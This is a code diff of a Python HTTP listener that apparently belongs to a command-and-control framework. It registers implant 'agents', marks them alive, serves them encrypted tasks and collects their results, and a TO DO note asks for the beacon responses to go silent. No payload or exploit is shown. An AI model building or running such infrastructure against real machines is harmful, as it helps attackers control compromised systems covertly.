@@ -3,12 +3,10 @@ from controllers.db import *
 from http.server import BaseHTTPRequestHandler
 import os
 from controllers.AES import *
-
+from http.server import HTTPServer
 ''' 
 TO DO: 
 1- Response handling should not return a callback/error message but should act silent instead
-2- Implement end-to-end encryption
-3- Implementing the encryption inside 
 '''
 
 
@@ -24,11 +22,13 @@ class Listener(BaseHTTPRequestHandler):
             try:
                 agentID = os.path.split(self.path)[1]
                 agentIP = self.client_address[0]
-                listenerID = getAgentListener(agentID)
-                registerAgent(agentID, agentIP, listenerID)
+                db.agents.update_one(
+                    {'id': agentID}, {'$set': {'ip': agentIP}})
+                db.agents.update_one(
+                    {'id': agentID}, {'$set': {'status': 'alive'}})
                 self.send_response(200)
                 self.end_headers()
-                f = "Agent Registered"
+                f = "Success"
                 self.wfile.write(bytes(f, 'utf-8'))
             except:
                 f = "Some unexpected error occured"
@@ -47,16 +47,16 @@ class Listener(BaseHTTPRequestHandler):
                     self.wfile.write(bytes(cipher, 'utf-8'))
                     # ---------------------------------------------------------
                 else:
+                    self.wfile.write(bytes('', 'utf-8'))
                     # No task available, shush the beacon
-                    pass
             except:
                 f = "Some unexpected error occured"
                 self.send_error(500, f)
 
     def do_POST(self):
-        if self.path.startswith('/task/results/') == True and len(os.path.split(self.path)) == 3:
+        if self.path.startswith('/task/results/') == True and len(os.path.split(self.path)) == 2:
             try:
-                agentID = os.path.split(self.path)[2]
+                agentID = os.path.split(self.path)[1]
                 self._set_headers()
                 content_len = int(self.headers.get('content-length'))
                 # ---------------------------------------------------------
